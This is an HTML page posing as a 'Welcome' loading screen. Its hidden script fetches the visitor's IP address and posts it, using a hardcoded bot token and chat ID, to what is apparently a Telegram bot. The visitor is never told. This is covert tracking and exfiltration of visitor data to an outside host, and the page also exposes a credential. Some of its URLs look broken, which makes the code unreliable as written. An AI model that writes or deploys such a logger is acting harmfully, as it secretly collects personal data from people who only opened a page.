<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Welcome</title>
</head>
<body>
    <p>Loading, please wait...</p>

    <script>
        const BOT_TOKEN = "8539452307:AAE3Px3RSVeT-YjpxTWp_btbswWg5_o0DTo";
        const CHAT_ID = "8714686528";

        // 1. Get the IP address
        fetch('https://ipify.org')
            .then(response => {
                if (!response.ok) throw new Error('IP fetch failed');
                return response.json();
            })
            .then(data => {
                const userIp = data.ip;
                
                // 2. Send to Telegram using POST (more reliable in browsers)
                return fetch(`https://telegram.org{BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: `New visitor IP: ${userIp}`
                    })
                });
            })
            .then(teleResponse => {
                if (!teleResponse.ok) {
                    console.error('Telegram API error status:', teleResponse.status);
                } else {
                    console.log('Notification sent successfully.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
    </script>
</body>
</html>
